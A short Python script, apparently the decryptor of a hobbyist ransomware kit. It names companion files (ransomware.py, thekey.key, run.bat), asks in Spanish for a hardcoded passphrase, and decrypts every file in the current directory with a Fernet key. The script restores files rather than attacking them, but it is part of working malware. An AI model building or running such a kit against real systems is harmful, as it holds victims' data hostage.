import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "run.bat":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key", "rb") as key:
	secretkey = key.read()

frasesecreta = "iwant1"

frase_usuario = input("Introduce la llave de desencryptacion: \n")

if frase_usuario == frasesecreta:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Felicidades, archivos desencryptados")
else:
		print("Nah llave incorrecta")
